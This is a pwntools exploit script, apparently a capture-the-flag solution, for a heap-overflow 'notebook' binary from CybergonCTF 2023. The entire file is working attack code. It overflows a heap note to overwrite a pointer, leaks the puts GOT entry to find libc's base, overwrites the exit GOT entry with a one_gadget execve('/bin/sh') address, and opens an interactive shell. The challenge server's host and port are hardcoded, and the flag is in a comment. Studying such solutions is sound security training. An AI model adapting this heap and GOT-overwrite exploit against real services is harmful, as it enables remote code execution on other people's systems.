#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./notebook_patched")
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("cybergon2023.webhop.me", 5002)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	r.recvuntil(b'Exit')
	r.sendline(b'1')
	r.recvuntil(b'index>')
	r.sendline(b'0')
	r.recvuntil(b'content>')
	r.sendline(b'AAAAAAA')

	r.recvuntil(b'Exit')
	r.sendline(b'1')
	r.recvuntil(b'index>')
	r.sendline(b'1')
	r.recvuntil(b'content>')
	r.sendline(b'BBBBBBB')
	
	r.recvuntil(b'Exit')
	r.sendline(b'2')
	r.recvuntil(b'index>')
	r.sendline(b'0')
	r.recvuntil(b'content>')
	r.sendline(b'AAAAAAAA' * 3 + p64(0x21) + p64(exe.got['puts']))

	r.recvuntil(b'Exit')
	r.sendline(b'3')
	r.recvuntil(b'1. ')
	puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
	libc.address = puts_addr - libc.symbols['puts']
	success(f'{hex(libc.address)=}')

	'''
	0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
	constraints:
		rsp & 0xf == 0
		rcx == NULL
		rbp == NULL || (u16)[rbp] == NULL

	0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
	constraints:
		address rbp-0x78 is writable
		[r10] == NULL || r10 == NULL
		[[rbp-0x70]] == NULL || [rbp-0x70] == NULL

	0xebcf5 execve("/bin/sh", r10, rdx)
	constraints:
		address rbp-0x78 is writable
		[r10] == NULL || r10 == NULL
		[rdx] == NULL || rdx == NULL

	0xebcf8 execve("/bin/sh", rsi, rdx)
	constraints:
		address rbp-0x78 is writable
		[rsi] == NULL || rsi == NULL
		[rdx] == NULL || rdx == NULL
	'''
	og = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]

	r.recvuntil(b'Exit')
	r.sendline(b'2')
	r.recvuntil(b'index>')
	r.sendline(b'0')
	r.recvuntil(b'content>')
	r.sendline(b'AAAAAAAA' * 3 + p64(0x21) + p64(exe.got['exit']))

	r.recvuntil(b'Exit')
	r.sendline(b'2')
	r.recvuntil(b'index>')
	r.sendline(b'1')
	r.recvuntil(b'content>')
	r.sendline(p64(libc.address + og[3]))

	r.recvuntil(b'Exit')
	r.sendline(b'0')

	r.interactive()


if __name__ == "__main__":
	main()


# CybergonCTF{Heap_with_leak!}
